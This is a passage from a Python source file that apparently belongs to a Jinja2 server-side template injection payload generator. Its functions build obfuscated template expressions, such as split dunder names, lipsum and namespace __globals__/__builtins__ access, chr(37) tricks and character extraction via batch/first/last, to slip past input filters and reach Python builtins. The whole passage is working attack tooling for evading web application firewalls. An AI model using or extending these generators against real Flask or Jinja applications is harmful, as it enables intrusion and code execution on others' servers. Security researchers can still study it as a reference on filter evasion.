    return [(EXPRESSION, precedence["plus"], target_list)]


@expression_gen
def gen_positive_integer_numbersum2(context: dict, value: int):
    if value < 5:
        return [(UNSATISFIED,)]
    alternatives = []
    for i in range(min(40, value - 1), 3, -1):
        inner = ",".join([str(i)] * (value // i) + [str(value % i)])
        alternatives.append([(LITERAL, "({})|sum".format(inner))])
    target_list = [(ONEOF, *alternatives)]
    return [(EXPRESSION, precedence["filter"], target_list)]


@expression_gen
def gen_positive_integer_count(context: dict, value: int):
    target_list = [(LITERAL, "({})|count".format(",".join("x" * value)))]
    return [(EXPRESSION, precedence["filter"], target_list)]


@expression_gen
def gen_positive_integer_onesum1(context: dict, value: int):
    target_list = [(LITERAL, "{}".format("+".join(["1"] * value)))]
    return [(EXPRESSION, precedence["plus"], target_list)]


@expression_gen
def gen_positive_integer_onesum2(context: dict, value: int):
    target_list = [(LITERAL, "({},)|sum".format(",".join(["1"] * value)))]
    return [(EXPRESSION, precedence["filter"], target_list)]


@expression_gen
def gen_positive_integer_truesum1(context: dict, value: int):
    target_list = [(LITERAL, "{}".format("+".join(["True"] * value)))]
    return [(EXPRESSION, precedence["plus"], target_list)]


@expression_gen
def gen_positive_integer_truesum2(context: dict, value: int):
    target_list = [(LITERAL, "({},)|sum".format(",".join(["True"] * value)))]
    return [(EXPRESSION, precedence["filter"], target_list)]


@expression_gen
def gen_positive_integer_bool(context: dict, value: int):
    if value not in (0, 1):
        return [(UNSATISFIED,)]

    target_list = [(LITERAL, str(value == 1))]
    return [(EXPRESSION, precedence["literal"], target_list)]


@expression_gen
def gen_positive_integer_indexoftrue(context: dict, value: int):
    if value <= 1:
        return [(UNSATISFIED,)]
    falses = [(LITERAL, "False,") for _ in range(value - 1)]
    target_list = (
        [
            (LITERAL, "("),
        ]
        + falses
        + [(LITERAL, ",True).index(True)")]
    )
    return [(EXPRESSION, precedence["function_call"], target_list)]


# ---


@expression_gen
def gen_integer_literal(context: dict, value: int):
    return [(EXPRESSION, precedence["literal"], [(LITERAL, str(value))])]


@expression_gen
def gen_integer_context(context: dict, value: int):
    if value not in context.values():
        return [(UNSATISFIED,)]
    v = [k for k, v in context.items() if v == value][0]
    return [
        (EXPRESSION, precedence["literal"], [(LITERAL, v), (WITH_CONTEXT_VAR, v)]),
    ]


@expression_gen
def gen_integer_zero(context: dict, value: int):
    if value != 0:
        return [(UNSATISFIED,)]
    return [(ZERO,)]


@expression_gen
def gen_integer_positive(context: dict, value: int):
    if value <= 0:
        return [(UNSATISFIED,)]
    return [(POSITIVE_INTEGER, value)]


@expression_gen
def gen_integer_negative(context: dict, value: int):
    if value >= 0:
        return [(UNSATISFIED,)]
    target_list = [(LITERAL, "-"), (POSITIVE_INTEGER, abs(value))]
    return [(EXPRESSION, precedence["subtract"], target_list)]


@expression_gen
def gen_integer_subtract(context: dict, value: int):
    ints = [
        (var_name, var_value)
        for var_name, var_value in context.items()
        if isinstance(var_value, int) and var_value > 0
    ]

    if ints == []:
        return [(UNSATISFIED,)]

    ints.sort(key=lambda pair: pair[1], reverse=True)
    bigger = [pair for pair in ints if pair[1] >= value]
    if not bigger:
        return [(UNSATISFIED,)]
    to_sub_name, to_sub_value = min(bigger, key=lambda pair: pair[1])
    ints = [pair for pair in ints if pair[1] <= to_sub_value]
    value_left = to_sub_value - value

    sub_vars = []
    while value_left != 0:
        while ints and ints[0][1] > value_left:
            ints = ints[1:]
        if not ints:
            return [(UNSATISFIED,)]
        value_left -= ints[0][1]
        sub_vars.append(ints[0][0])
    return [
        (
            LITERAL,
            "({})".format(
                "-".join(
                    [
                        to_sub_name,
                    ]
                    + sub_vars
                )
            ),
        )
    ] + [
        (WITH_CONTEXT_VAR, v)
        for v in [
            to_sub_name,
        ]
        + sub_vars
    ]


# ---


@expression_gen
def gen_string_lower_c_literal1(context):
    return [(EXPRESSION, precedence["literal"], [(LITERAL, "'c'")])]


@expression_gen
def gen_string_lower_c_literal2(context):
    return [(EXPRESSION, precedence["literal"], [(LITERAL, '"c"')])]


@expression_gen
def gen_string_lower_c_joindict(context):
    return [(EXPRESSION, precedence["filter"], [(LITERAL, "dict(c=x)|join")])]


@expression_gen
def gen_string_lower_c_lipsumurlencode(context):
    return [
        (
            EXPRESSION,
            precedence["filter"],
            [(LITERAL, "lipsum|pprint|first|urlencode|last|lower")],
        )
    ]


@expression_gen
def gen_string_lower_c_lipsumbatch(context):
    return [
        (
            EXPRESSION,
            precedence["filter"],
            [
                (LITERAL, "lipsum|escape|batch("),
                (INTEGER, 8),
                (LITERAL, ")|first|last"),
            ],
        )
    ]


@expression_gen
def gen_string_lower_c_joinerbatch(context):
    return [
        (
            EXPRESSION,
            precedence["filter"],
            [
                (LITERAL, "joiner|string|batch("),
                (INTEGER, 2),
                (LITERAL, ")|first|last"),
            ],
        )
    ]


@expression_gen
def gen_string_lower_c_namespacebatch(context):
    return [
        (
            EXPRESSION,
            precedence["filter"],
            [
                (LITERAL, "namespace|escape|batch("),
                (INTEGER, 36),
                (LITERAL, ")|first|last"),
            ],
        )
    ]


# range|trim|batch(2)|first|last


@expression_gen
def gen_string_lower_c_classbatch(context):
    alternatives = [
        [
            (LITERAL, f"({class_obj}|{tostring_filter}"),
            (LITERAL, "|batch("),
            (INTEGER, 2),
            (LITERAL, ")|first|last)"),
        ]
        for class_obj in [
            "range",
            "cycler",
            "joiner",
            "namespace",
        ]
        for tostring_filter in ["trim", "string"]
    ]
    return [(EXPRESSION, precedence["filter"], [(ONEOF, *alternatives)])]


@expression_gen
def gen_string_lower_c_classbatch2(context):
    alternatives = [
        [
            (LITERAL, f"({class_obj}|e"),
            (LITERAL, "|batch("),
            (INTEGER, 5),
            (LITERAL, ")|first|last)"),
        ]
        for class_obj in [
            "range",
            "cycler",
            "joiner",
            "namespace",
        ]
    ]
    return [(EXPRESSION, precedence["filter"], [(ONEOF, *alternatives)])]


# ---


@expression_gen
def gen_string_percent_literal1(context):
    return [(EXPRESSION, precedence["literal"], [(LITERAL, "'%'")])]


@expression_gen
def gen_string_percent_literal2(context):
    return [(EXPRESSION, precedence["literal"], [(LITERAL, '"%"')])]


@expression_gen
def gen_string_percent_context(context):
    if "%" not in context.values():
        return [(UNSATISFIED,)]
    v = [k for k, v in context.items() if v == "%"][0]
    return [(EXPRESSION, precedence["literal"], [(LITERAL, v), (WITH_CONTEXT_VAR, v)])]


@expression_gen
def gen_string_percent_urlencode1(context):
    return [(EXPRESSION, precedence["filter"], [(LITERAL, "lipsum()|urlencode|first")])]


@expression_gen
def gen_string_percent_urlencode2(context):
    return [
        (EXPRESSION, precedence["filter"], [(LITERAL, "{}|escape|urlencode|first")])
    ]


@expression_gen
def gen_string_percent_lipsum2(context):
    return [
        (
            EXPRESSION,
            precedence["function_call"],
            [(LITERAL, "lipsum['__glob''als__']['__builti''ns__']['chr'](37)")],
        )
    ]


@expression_gen
def gen_string_percent_lipsum3(context):
    return [
        (
            EXPRESSION,
            precedence["function_call"],
            [(LITERAL, "lipsum.__globals__.__builtins__.chr(37)")],
        )
    ]


@expression_gen
def gen_string_percent_lipsum4(context):  # TODO: use variables
    return [
        (
            EXPRESSION,
            precedence["function_call"],
            [(LITERAL, "lipsum['__glob''als__']['__builti''ns__']['chr'](37)")],
        )
    ]


# ((12).__mod__.__doc__|batch(12)|first|last)


@expression_gen
def gen_string_percent_moddoc(context):
    target_list = [
        (
            ONEOF,
            [(LITERAL, "(1).__mod__.__doc__")],
            [(LITERAL, "(( ).__len__( )).__mod__.__doc__")],
            [(LITERAL, "((\t).__len__(\t)).__mod__.__doc__")],
            [(LITERAL, "((\n).__len__(\n)).__mod__.__doc__")],
            [(LITERAL, "([ ].__len__( )).__mod__.__doc__")],
            [
                (
                    LITERAL,
                    "((1)|attr(dict(__mod__=1)|first)|attr(dict(__doc__=1)|first))",
                )
            ],
            [
                (
                    LITERAL,
                    "((1)|attr(dict(__m=1,od__=1)|join)|attr(dict(__d=1,oc__=1)|join))",
                )
            ],
        ),
        (
            ONEOF,
            [(LITERAL, "["), (INTEGER, 11), (LITERAL, "]")],
            [(LITERAL, ".__getitem__("), (INTEGER, 11), (LITERAL, ")")],
            [(LITERAL, "|batch(12)|first|last")],
        ),
    ]
    return [(EXPRESSION, precedence["filter"], target_list)]


@expression_gen
def gen_string_percent_namespace(context):
    target_list = [
        (
            LITERAL,
            "namespace['__ini''t__']['__glob''al''s__']['__builti''ns__']['chr'](",
        ),
        (INTEGER, 37),
        (LITERAL, ")"),
    ]
    return [(EXPRESSION, precedence["function_call"], target_list)]


@expression_gen
def gen_string_percent_dictbatch(context):
    whatever_onedigit_number = (ONEOF, *[[(INTEGER, i)] for i in range(1, 10)])
    target_list = [
        (
            LITERAL,
            "((dict(dict(dict(a=",
        ),
        whatever_onedigit_number,
        (LITERAL, ")|tojson|batch("),
        (INTEGER, 2),
        (LITERAL, "))|batch("),
        (INTEGER, 2),
        (LITERAL, "))|join,"),
        (STRING_LOWERC,),
        (LITERAL, ",dict()|trim|last)|join).format("),
        (INTEGER, 37),
        (LITERAL, ")"),
    ]
    return [(EXPRESSION, precedence["function_call"], target_list)]


@expression_gen
def gen_string_percent_lipsum(context):
    target_list = [
        (
            LITERAL,
            "lipsum[(lipsum|escape|batch(22)|list|first|last)*2"
            + "+dict(globals=x)|join+(lipsum|escape|batch(22)|list|first|last)*2]"
            + "[(lipsum|escape|batch(22)|list|first|last)*2+dict(builtins=x)"
            + "|join+(lipsum|escape|batch(22)|list|first|last)*2][dict(chr=x)|join](37)",
        )
    ]
    return [(EXPRESSION, precedence["function_call"], target_list)]


@expression_gen
def gen_string_percent_lipsumcomplex(context):
    target_list = [
        (LITERAL, "lipsum[(lipsum|escape|batch("),
        (INTEGER, 22),
        (LITERAL, ")|list|first|last)*"),
        (INTEGER, 2),
        (LITERAL, "+dict(glo=x,bals=x)|join+(lipsum|escape|batch("),
        (INTEGER, 22),
        (LITERAL, ")|list|first|last)*"),
        (INTEGER, 2),
        (LITERAL, "][(lipsum|escape|batch("),
        (INTEGER, 22),
        (LITERAL, ")|list|first|last)*"),
        (INTEGER, 2),
        (LITERAL, "+dict(bui=x,ltins=x)|join+(lipsum|escape|batch("),
        (INTEGER, 22),
        (LITERAL, ")|list|first|last)*"),
        (INTEGER, 2),
        (LITERAL, "][dict(c=x,hr=x)|join]("),
        (INTEGER, 37),
        (LITERAL, ")"),
    ]
    return [(EXPRESSION, precedence["function_call"], target_list)]


@expression_gen
def gen_string_percent_urlencodelong(context):
    target_list = [
        (LITERAL, "(lipsum,)|map("),
        (
            ONEOF,
            [(LITERAL, "dict(ur=x,le=x,nco=x,de=x)|join")],
            [(LITERAL, "'ur''lencode'")],
            [(LITERAL, '"ur""lencode"')],
        ),
        (LITERAL, ")|first|first"),
    ]
    return [(EXPRESSION, precedence["enclose"], target_list)]


# (dict(((0,1),(0,1)))|replace(1|center|first,x)|replace(1,'c')).format(37)
@expression_gen
def gen_string_percent_replaceformat(context):
    target_list = [
        (
            LITERAL,
            "(dict(((0,1),(0,1)))|replace(1|center|first,x)|replace(1,",
        ),
        (STRING_LOWERC,),
        (LITERAL, ")).format("),
        (INTEGER, 37),
        (LITERAL, ")"),
    ]
    return [(EXPRESSION, precedence["function_call"], target_list)]


# (dict(((2,3),(2,3)))|replace(1|center|first,x)|replace(3,'c')).format(2,2,37)
@expression_gen
def gen_string_percent_replaceformat2(context):
    target_list = [
        (
            LITERAL,
            "(dict(((2,3),(2,3)))|replace(1|center|first,x)|replace(3,",
        ),
        (STRING_LOWERC,),
        (LITERAL, ")).format(2,2,"),
        (INTEGER, 37),
        (LITERAL, ")"),
    ]
    return [(EXPRESSION, precedence["function_call"], target_list)]


# ({1:1}|trim|replace(1,x|trim)|replace(x|center|first,"c")).format(37)


@expression_gen
def gen_string_percent_replaceformat3(context):
    target_list = [
        (
            ONEOF,
            *[
                [
                    (
                        LITERAL,
                        "({NUM:NUM}|trim|replace(NUM,x|trim)|replace(x|center|first,".replace(
                            "NUM", str(i)
                        ),
                    )
                ]
                for i in range(0, 10)
            ],
        ),
        (STRING_LOWERC,),
        (LITERAL, ")).format("),
        (INTEGER, 37),
        (LITERAL, ")"),
    ]
    return [(EXPRESSION, precedence["function_call"], target_list)]


# ---


@expression_gen
def gen_string_percent_lower_c_literal1(context):
    target_list = [(LITERAL, "'%c'")]
    return [(EXPRESSION, precedence["literal"], target_list)]


@expression_gen
def gen_string_percent_lower_c_literal2(context):
    target_list = [(LITERAL, '"%c"')]
    return [(EXPRESSION, precedence["literal"], target_list)]


@expression_gen
def gen_string_percent_lower_c_context(context):
    if "%c" not in context.values():
        return [(UNSATISFIED,)]
    vs = [k for k, v in context.items() if v == "%c"]
    alternatives = [[(LITERAL, v)] + [(WITH_CONTEXT_VAR, v)] for v in vs]
    return [(EXPRESSION, precedence["literal"], [(ONEOF, *alternatives)])]


@expression_gen
def gen_string_percent_lower_c_concat(context):
    return [(STRING_CONCAT, (STRING_PERCENT,), (STRING_LOWERC,))]


@expression_gen
def gen_string_percent_lower_c_dictjoin(context):
    # "(dict([('%',x),('c',x)])|join)"
    target_list = [
        (LITERAL, "dict([("),
        (STRING_PERCENT,),
        (LITERAL, ",x),("),
        (STRING_LOWERC,),
        (LITERAL, ",x)])|join"),
    ]
    return [(EXPRESSION, precedence["filter"], target_list)]


@expression_gen
def gen_string_percent_lower_c_listjoin(context):
    # "(['%','c']|join)"
    target_list = [
        (LITERAL, "["),
        (STRING_PERCENT,),
        (LITERAL, ","),
        (STRING_LOWERC,),
        (LITERAL, "]|join"),
    ]
    return [(EXPRESSION, precedence["filter"], target_list)]


@expression_gen
def gen_string_percent_lower_c_tuplejoin(context):
    # "(('%','c')|join)"
    target_list = [
        (LITERAL, "("),
        (STRING_PERCENT,),
        (LITERAL, ","),
        (STRING_LOWERC,),
        (LITERAL, ")|join"),
    ]
    return [(EXPRESSION, precedence["filter"], target_list)]


@expression_gen
def gen_string_percent_lower_c_replaceconcat(context):
    # ('c'|replace(x|trim,'%',1))
    target_list = [
        (STRING_LOWERC,),
        (LITERAL, "|replace(x|trim,"),
        (STRING_PERCENT,),
        (LITERAL, ","),
        (INTEGER, 1),
        (LITERAL, ")"),
    ]
    return [(EXPRESSION, precedence["filter"], target_list)]


@expression_gen
def gen_string_percent_lower_c_cycler(context):
    target_list = [
        (LITERAL, "cycler|pprint|list|pprint|urlencode|batch("),
        (INTEGER, 10),
        (LITERAL, ")|first|join|batch("),
        (INTEGER, 8),
        (LITERAL, ")|list|last|reverse|join|lower"),
    ]
    return [(EXPRESSION, precedence["filter"], target_list)]


# ---


@expression_gen
def gen_string_many_percent_lower_c_asis(context, count: int):
    if count != 1:
        return [(UNSATISFIED,)]
    return [(STRING_PERCENT_LOWER_C,)]


@expression_gen
def gen_string_many_percent_lower_c_multiply(context, count: int):
    return [(MULTIPLY, (STRING_PERCENT_LOWER_C,), (INTEGER, count))]


@expression_gen
def gen_string_many_percent_lower_c_literal1(context, count: int):
    return [
        (
            EXPRESSION,
            precedence["literal"],
            [(LITERAL, "'"), (LITERAL, "%c" * count), (LITERAL, "'")],
        )
    ]


@expression_gen
def gen_string_many_percent_lower_c_literal2(context, count: int):
    return [
        (
            EXPRESSION,
            precedence["literal"],
            [(LITERAL, '"'), (LITERAL, "%c" * count), (LITERAL, '"')],
        )
    ]


@expression_gen
def gen_string_many_percent_lower_c_replacespace(context, count: int):
    # (x|center(2)|replace(x|center|first,'%c'))
    target_list = [
        (LITERAL, "x|center("),
        (INTEGER, count),
        (LITERAL, ")|replace(x|center|first,"),
        (STRING_PERCENT_LOWER_C,),
        (LITERAL, ")"),
    ]
    return [(EXPRESSION, precedence["filter"], target_list)]


@expression_gen
def gen_string_many_percent_lower_c_nulljoin(context, count: int):
    # ((x,x,x)|join('%c'))
    target_list = (
        [
            (LITERAL, "("),
        ]
        + [(LITERAL, "x,") for _ in range(count + 1)]
        + [(LITERAL, ")|join("), (STRING_PERCENT_LOWER_C,), (LITERAL, ")")]
    )
    return [(EXPRESSION, precedence["filter"], target_list)]


@expression_gen
def gen_string_many_percent_lower_c_nulljoin2(context, count: int):
    # ((x,x,x)|join('%c'))
    target_list = (
        [
            (LITERAL, "("),
        ]
        + [(LITERAL, "x,") for _ in range(count + 1)]
        + [(LITERAL, ")|join("), (STRING_PERCENT_LOWER_C,), (LITERAL, ",)")]
    )
    return [(EXPRESSION, precedence["filter"], target_list)]


@expression_gen
def gen_string_many_percent_lower_c_concat(context, count: int):
    return [(STRING_CONCATMANY, [(STRING_PERCENT_LOWER_C,) for _ in range(count)])]


@expression_gen
def gen_string_many_percent_lower_c_join(context, count: int):
    l = [
        [
            (LITERAL, "("),
            (STRING_PERCENT_LOWER_C,),
        ]
        if i == 0
        else [
            (LITERAL, ","),
            (STRING_PERCENT_LOWER_C,),
        ]
        for i in range(count)
    ] + [[(LITERAL, ")|join")]]
    target_list = [item for lst in l for item in lst]
    return [(EXPRESSION, precedence["filter"], target_list)]


# ---


@expression_gen
def gen_string_underline_literal1(context):
    return [(EXPRESSION, precedence["literal"], [(LITERAL, "'_'")])]


@expression_gen
def gen_string_underline_literal2(context):
    return [(EXPRESSION, precedence["literal"], [(LITERAL, '"_"')])]


@expression_gen
def gen_string_underline_context(context: dict):
    if "_" in context.values():
        v = [k for k, v in context.items() if v == "_"][0]
        target_list = [(LITERAL, v)] + [(WITH_CONTEXT_VAR, v)]
        return [(EXPRESSION, precedence["literal"], target_list)]
    return [(UNSATISFIED,)]


@expression_gen
def gen_string_underline_lipsum(context):
    target_list = [
        (LITERAL, "lipsum|escape|batch("),
        (INTEGER, 22),
        (LITERAL, ")|list|first|last"),
    ]
    return [(EXPRESSION, precedence["filter"], target_list)]


@expression_gen
def gen_string_underline_tupleselect(context):
    target_list = [
        (LITERAL, "()|select|string|batch("),
        (INTEGER, 25),
        (LITERAL, ")|first|last"),
    ]
    return [(EXPRESSION, precedence["filter"], target_list)]


# ---


@expression_gen
def gen_string_many_format_c_complex(context, num):
    fomat_c_target_list = [
        (
            LITERAL,
            (
                "{1:2}|string|replace({1:2}|string|batch(4)|first|last,{}|join)"
                + "|replace(1|string,{}|join)|replace(2|string,"
            ),
        ),
        (STRING_LOWERC,),
        (LITERAL, ")"),
    ]
    return [
        (
            MULTIPLY,
            (EXPRESSION, precedence["filter"], fomat_c_target_list),
            (INTEGER, num),
        )
    ]


# ---


@expression_gen
def gen_char_literal1(context, c):
    target_list = [(LITERAL, f"'{c}'" if c != "'" else "'\\''")]
    return [(EXPRESSION, precedence["literal"], target_list)]


@expression_gen
def gen_char_literal2(context, c):
    target_list = [(LITERAL, f'"{c}"' if c != '"' else '"\\""')]
    return [(EXPRESSION, precedence["literal"], target_list)]


@expression_gen
def gen_char_underline(context, c):
    target_list = [(UNSATISFIED,)] if c != "_" else [(STRING_UNDERLINE,)]
    return [(EXPRESSION, precedence["literal"], target_list)]


@expression_gen
def gen_char_percent(context, c):
    target_list = [(UNSATISFIED,)] if c != "%" else [(STRING_PERCENT,)]
    return [(EXPRESSION, precedence["literal"], target_list)]


@expression_gen
def gen_char_select(context, c):
    char_patterns = {
        "(dict|trim|list)[INDEX]": {
            1: "c",
            2: "l",
            3: "a",
            4: "s",
            5: "s",
            6: " ",
            7: "'",
            8: "d",
            9: "i",
            10: "c",
            11: "t",
        },
        "dict|trim|list|batch(INDEX)|first|last": {
            2: "c",
            3: "l",
            4: "a",
            5: "s",
            6: "s",
            7: " ",
            8: "'",
            9: "d",
            10: "i",
            11: "c",
            12: "t",
        },
        "({}|select()|trim|list)[INDEX]": {
            1: "g",
            2: "e",
            3: "n",
            4: "e",
            5: "r",
            6: "a",
            7: "t",
            8: "o",
            9: "r",
            10: " ",
            11: "o",
            12: "b",
            13: "j",
            14: "e",
            15: "c",
            16: "t",
            17: " ",
            18: "s",
            19: "e",
            20: "l",
            21: "e",
            22: "c",
            23: "t",
            24: "_",
            25: "o",
            26: "r",
            27: "_",
            28: "r",
            29: "e",
            30: "j",
            31: "e",
            32: "c",
            33: "t",
            34: " ",
            35: "a",
            36: "t",
        },
        "{}|select()|trim|list|batch(INDEX)|first|last": {
            2: "g",
            3: "e",
            4: "n",
            5: "e",
            6: "r",
            7: "a",
            8: "t",
            9: "o",
            10: "r",
            11: " ",
            12: "o",
            13: "b",
            14: "j",
            15: "e",
            16: "c",
            17: "t",
            18: " ",
            19: "s",
            20: "e",
            21: "l",
            22: "e",
            23: "c",
            24: "t",
            25: "_",
            26: "o",
            27: "r",
            28: "_",
            29: "r",
            30: "e",
            31: "j",
            32: "e",
            33: "c",
            34: "t",
            35: " ",
            36: "a",
            37: "t",
        },
        "(lipsum|trim|list)[INDEX]": {
            1: "f",
            2: "u",
            3: "n",
            4: "c",
            5: "t",
            6: "i",
            7: "o",
            8: "n",
            9: " ",
            10: "g",
            11: "e",
            12: "n",
            13: "e",
            14: "r",
            15: "a",
            16: "t",
            17: "e",
            18: "_",
            19: "l",
            20: "o",
            21: "r",
            22: "e",
            23: "m",
            24: "_",
            25: "i",
            26: "p",
            27: "s",
            28: "u",
            29: "m",
            30: " ",
            31: "a",
            32: "t",
            33: " ",
            34: "0",
            35: "x",
            36: "7",
        },
        "lipsum|trim|list|batch(INDEX)|first|last": {
            2: "f",
            3: "u",
            4: "n",
            5: "c",
            6: "t",
            7: "i",
            8: "o",
            9: "n",
            10: " ",
            11: "g",
            12: "e",
            13: "n",
            14: "e",
            15: "r",
            16: "a",
            17: "t",
            18: "e",
            19: "_",
            20: "l",
            21: "o",
            22: "r",
            23: "e",
            24: "m",
            25: "_",
            26: "i",
            27: "p",
            28: "s",
            29: "u",
            30: "m",
            31: " ",
            32: "a",
            33: "t",
            34: " ",
            35: "0",
            36: "x",
            37: "7",
        },
        "(()|trim|list)[INDEX]": {0: "(", 1: ")"},
    }
    matches = []
    for pattern, d in char_patterns.items():
        for index, value in d.items():
            if value == c:
                matches.append([(LITERAL, pattern.replace("INDEX", str(index)))])
    if not matches:
        return [(UNSATISFIED,)]
    target_list = [(ONEOF, *matches)]
    return [(EXPRESSION, precedence["filter"], target_list)]


@expression_gen
def gen_char_flaskg(context, c):
    d = {
        1: "&",
        2: "l",
        3: "t",
        4: ";",
        5: "f",
        6: "l",
        7: "a",
        8: "s",
        9: "k",
        10: ".",
        11: "g",
        12: " ",
        13: "o",
        14: "f",
    }
    matches = []
    pattern = "g|e|batch(INDEX)|first|last"
    for index, value in d.items():
        if value == c:
            matches.append([(LITERAL, pattern.replace("INDEX", str(index)))])
    target_list = [(ONEOF, *matches)]
    return [(EXPRESSION, precedence["filter"], target_list)]


@expression_gen
def gen_char_dict(context, c):
    if not re.match("[A-Za-z]", c):
        return [(UNSATISFIED,)]
    target_list = [(LITERAL, f"dict({c}=x)|join")]
    return [(EXPRESSION, precedence["filter"], target_list)]


@expression_gen
def gen_char_num(context, c):
    if not re.match("[0-9]", c):
        return [(UNSATISFIED,)]
    target_list = [
        (INTEGER, int(c)),
        (LITERAL, ".__str__( )"),
    ]
    return [(EXPRESSION, precedence["function_call"], target_list)]


@expression_gen
def gen_char_num2(context, c):
    if not re.match("[0-9]", c):
        return [(UNSATISFIED,)]
    target_list = [
        (
            LITERAL,
            "(",
        ),
        (INTEGER, int(c)),
        (LITERAL, ")|string"),
    ]
    return [(EXPRESSION, precedence["filter"], target_list)]


# ---
# 以下的gen_string会互相依赖，但是产生互相依赖时传入的字符串长度会减少所以不会发生无限调用


@expression_gen
def gen_string_1(context: dict, value: str):
    chars = [str_escape(c, "'") for c in value]
    target_list = [(LITERAL, "'{}'".format("".join(chars)))]
    return [(EXPRESSION, precedence["literal"], target_list)]


@expression_gen
def gen_string_2(context: dict, value: str):
    chars = [str_escape(c, '"') for c in value]
    target_list = [(LITERAL, '"{}"'.format("".join(chars)))]
    return [(EXPRESSION, precedence["literal"], target_list)]


@expression_gen
def gen_string_manypercentlowerc(context: dict, value: str):
    if value.replace("%c", "") != "" or len(value) == "":
        return [(UNSATISFIED,)]
    return [(STRING_MANY_PERCENT_LOWER_C, value.count("%c"))]


@expression_gen
def gen_string_context(context: dict, value: str):
    if value not in context.values():
        return [(UNSATISFIED,)]
    vs = [k for k, v in context.items() if v == value]
    alternatives = [[(LITERAL, v)] + [(WITH_CONTEXT_VAR, v)] for v in vs]
    return [(EXPRESSION, precedence["literal"], [(ONEOF, *alternatives)])]


@expression_gen
def gen_string_twostringconcat(context: dict, value: str):
    if len(value) <= 2 or len(value) > 20:
        return [(UNSATISFIED,)]
    target_list = [
        # (LITERAL, "'"),  # ONEOF should output a valid expression
        (
            ONEOF,
            *[
                [
                    (LITERAL, "'{}'".format(str_escape(value[:i], "'"))),
                    (LITERAL, "'{}'".format(str_escape(value[i:], "'"))),
                ]
                for i in range(1, len(value) - 1)
            ],
        ),
    ]
    return [(EXPRESSION, precedence["literal"], target_list)]


@expression_gen
def gen_string_twostringconcat2(context: dict, value: str):
    if len(value) <= 2 or len(value) > 20:
        return [(UNSATISFIED,)]
    target_list = [
        # (LITERAL, '"'),  # ONEOF should output a valid expression
        (
            ONEOF,
            *[
                [
                    (LITERAL, "'{}'".format(str_escape(value[:i], '"'))),
                    (LITERAL, "'{}'".format(str_escape(value[i:], '"'))),
                ]
                for i in range(1, len(value) - 1)
            ],
        ),
    ]
    return [(EXPRESSION, precedence["literal"], target_list)]


@expression_gen
def gen_string_removedunder(context: dict, value: str):
    if not re.match("^__[A_Za-z0-9_]+__$", value):
        return [(UNSATISFIED,)]
    twounderline = (MULTIPLY, (STRING_UNDERLINE,), (INTEGER, 2))
    middle = (STRING, value[2:-2])
    return [
        (
            STRING_CONCATMANY,
            [
                twounderline,
                middle,
                twounderline,
            ],
        )
    ]


@expression_gen
def gen_string_removedunder2(context: dict, value: str):
    if not re.match("^__[A_Za-z][A_Za-z0-9]+__$", value):
        return [(UNSATISFIED,)]
    strings = [
        (STRING_UNDERLINE,),
        (STRING_UNDERLINE,),
        (STRING, value[2:-2]),
        (STRING_UNDERLINE,),
        (STRING_UNDERLINE,),
    ]
    return [(STRING_CONCATMANY, strings)]


@expression_gen
def gen_string_reverse1(context: dict, value: str):
    chars = [str_escape(c, "'") for c in value]
    target_list = [(LITERAL, "'{}'[::-1]".format("".join(chars[::-1])))]
    return [(EXPRESSION, precedence["slide"], target_list)]


@expression_gen
def gen_string_reverse2(context: dict, value: str):
    chars = [str_escape(c, '"') for c in value]
    target_list = [(LITERAL, '"{}"[::-1]'.format("".join(chars[::-1])))]
    return [(EXPRESSION, precedence["slide"], target_list)]


@expression_gen
def gen_string_lower1(context: dict, value: str):
    if value.upper().lower() != value:
        return [(UNSATISFIED,)]
    chars = [str_escape(c, "'") for c in value.upper()]
    target_list = [(LITERAL, "'{}'.lower()".format("".join(chars)))]
    return [(EXPRESSION, precedence["function_call"], target_list)]


@expression_gen
def gen_string_lower2(context: dict, value: str):
    if value.upper().lower() != value:
        return [(UNSATISFIED,)]
    chars = [str_escape(c, '"') for c in value.upper()]
    target_list = [(LITERAL, '"{}".lower()'.format("".join(chars)))]
    return [(EXPRESSION, precedence["function_call"], target_list)]


@expression_gen
def gen_string_lower3(context: dict, value: str):
    if value.upper().lower() != value:
        return [(UNSATISFIED,)]
    chars = [str_escape(c, "'") for c in value.upper()]
    target_list = [(LITERAL, "'{}'.lower( )".format("".join(chars)))]
    return [(EXPRESSION, precedence["function_call"], target_list)]


@expression_gen
def gen_string_lower4(context: dict, value: str):
    if value.upper().lower() != value:
        return [(UNSATISFIED,)]
    chars = [str_escape(c, '"') for c in value.upper()]
    target_list = [(LITERAL, '"{}".lower( )'.format("".join(chars)))]
    return [(EXPRESSION, precedence["function_call"], target_list)]


@expression_gen
def gen_string_lowerfilter1(context: dict, value: str):
    if value.upper().lower() != value:
        return [(UNSATISFIED,)]
    chars = [str_escape(c, "'") for c in value.upper()]
    target_list = [(LITERAL, "'{}'|lower".format("".join(chars)))]
    return [(EXPRESSION, precedence["filter"], target_list)]


@expression_gen
def gen_string_lowerfilter2(context: dict, value: str):
    if value.upper().lower() != value:
        return [(UNSATISFIED,)]
    chars = [str_escape(c, '"') for c in value.upper()]
    target_list = [(LITERAL, '"{}"|lower'.format("".join(chars)))]
    return [(EXPRESSION, precedence["filter"], target_list)]


@expression_gen
def gen_string_concat1(context: dict, value: str):
    target_list = [
        (
            LITERAL,
            "+".join("'{}'".format(str_escape(c, "'")) for c in value),
        )
    ]
    return [(EXPRESSION, precedence["plus"], target_list)]


@expression_gen
def gen_string_concat2(context: dict, value: str):
    target_list = [
        (
            LITERAL,
            "+".join('"{}"'.format(str_escape(c, '"')) for c in value),
        )
    ]
    return [(EXPRESSION, precedence["plus"], target_list)]


@expression_gen
def gen_string_concat3(context: dict, value: str):
    target_list = [(LITERAL, "".join('"{}"'.format(str_escape(c, '"')) for c in value))]
    return [(EXPRESSION, precedence["literal"], target_list)]


@expression_gen
def gen_string_dictjoin(context: dict, value: str):
    if not re.match("^[a-zA-Z_]+$", value):
        return [(UNSATISFIED,)]
    target_list = [(LITERAL, "dict({}=x)|join".format(value))]
    return [(EXPRESSION, precedence["filter"], target_list)]


# 以下规则生成的payload显著长于原string


@expression_gen
def gen_string_x1(context: dict, value: str):
    if any(ord(c) >= 128 for c in value):
        return [(UNSATISFIED,)]
    target = "".join("\\x" + hex(ord(c))[2:] for c in value)
    target_list = [(LITERAL, '"{}"'.format(target))]
    return [(EXPRESSION, precedence["literal"], target_list)]


@expression_gen
def gen_string_x2(context: dict, value: str):
    if any(ord(c) >= 128 for c in value):
        return [(UNSATISFIED,)]
    target = "".join("\\x" + hex(ord(c))[2:] for c in value)
    target_list = [(LITERAL, "'{}'".format(target))]
    return [(EXPRESSION, precedence["literal"], target_list)]


@expression_gen
